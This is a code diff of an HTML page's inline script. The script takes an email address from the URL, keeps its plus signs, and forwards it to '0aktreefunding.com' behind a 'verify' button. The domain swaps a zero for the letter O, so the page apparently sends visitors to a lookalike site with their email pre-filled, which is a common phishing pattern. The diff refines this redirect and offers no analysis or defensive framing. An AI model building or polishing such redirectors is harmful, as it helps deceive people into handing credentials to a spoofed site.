@@ -247,21 +247,20 @@
     </main>
 
     <script>
-        // Read the email query parameter from the current URL.
+        // Grab ?email= from the current URL.
+        // Replace + with %2B so email plus signs are preserved.
         const currentParams = new URLSearchParams(
-            window.location.search
+            window.location.search.replace(/\+/g, "%2B")
         );
 
         const email = currentParams.get("email");
 
         // Destination website.
-        const destination = new URL(
-            "https://0aktreefunding.com/?email="
-        );
+        const destination = new URL("https://0aktreefunding.com/");
 
-        // Forward the supplied email parameter.
-        if (email !== null && email.trim() !== "") {
-            destination.searchParams.set("email", email);
+        // Forward the supplied email parameter only if it exists and is not empty.
+        if (email && email.trim() !== "") {
+            destination.searchParams.set("email", email.trim());
         }
 
         const verifyButton =
